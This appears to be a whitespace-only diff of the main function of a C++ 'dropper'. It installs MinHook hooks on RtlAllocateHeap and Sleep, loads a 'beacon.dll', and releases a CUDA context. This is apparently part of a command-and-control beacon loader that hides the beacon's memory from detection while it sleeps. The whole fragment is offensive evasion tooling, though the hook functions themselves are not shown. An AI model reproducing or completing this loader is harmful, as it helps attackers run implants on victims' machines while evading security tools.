@@ -19,39 +19,39 @@ HMODULE dll;
 int main()
 {
     std::cout << "Starting\n";
-	GlobalThreadId = GetCurrentThreadId(); //We get the thread Id of our dropper!
+    GlobalThreadId = GetCurrentThreadId(); //We get the thread Id of our dropper!
 
-	printf("MH_Initialize()\n");
-	if (MH_Initialize() != MH_OK)
-		goto EXIT_ROUTINE;
+    printf("MH_Initialize()\n");
+    if (MH_Initialize() != MH_OK)
+        goto EXIT_ROUTINE;
 
-	printf("MH_CreateHookApiEx()\n");
-	if (MH_CreateHookApiEx(L"ntdll.dll", "RtlAllocateHeap", &HookedHeapAlloc, &OldHeapAlloc) != MH_OK)
-		goto EXIT_ROUTINE;
+    printf("MH_CreateHookApiEx()\n");
+    if (MH_CreateHookApiEx(L"ntdll.dll", "RtlAllocateHeap", &HookedHeapAlloc, &OldHeapAlloc) != MH_OK)
+        goto EXIT_ROUTINE;
 
-	printf("MH_CreateHookApiEx()\n");
-	if (MH_CreateHookApiEx(L"kernel32.dll", "Sleep", &HookedSleep, &OldSleep) != MH_OK)
-		goto EXIT_ROUTINE;
+    printf("MH_CreateHookApiEx()\n");
+    if (MH_CreateHookApiEx(L"kernel32.dll", "Sleep", &HookedSleep, &OldSleep) != MH_OK)
+        goto EXIT_ROUTINE;
 
-	printf("MH_EnableHook()\n");
-	if (MH_EnableHook(MH_ALL_HOOKS) != MH_OK)
-		goto EXIT_ROUTINE;
+    printf("MH_EnableHook()\n");
+    if (MH_EnableHook(MH_ALL_HOOKS) != MH_OK)
+        goto EXIT_ROUTINE;
 
-	printf("LoadingBeacon\n");
-	dll = LoadLibraryA("beacon.dll");
+    printf("LoadingBeacon\n");
+    dll = LoadLibraryA("beacon.dll");
 
-	//Test DLL
-	//run1(heapMap);
+    //Test DLL
+    //run1(heapMap);
 
-	int stop;
-	std::cin >> stop;
+    int stop;
+    std::cin >> stop;
 
 EXIT_ROUTINE:
-	MH_DisableHook(MH_ALL_HOOKS);
+    MH_DisableHook(MH_ALL_HOOKS);
 
-	if (Context != NULL)
-		Api.CudaDestroyContext(&Context);
+    if (Context != NULL)
+        Api.CudaDestroyContext(&Context);
 
-	if (Api.NvidiaLibary)
-		FreeLibrary(Api.NvidiaLibary);
+    if (Api.NvidiaLibary)
+        FreeLibrary(Api.NvidiaLibary);
 }
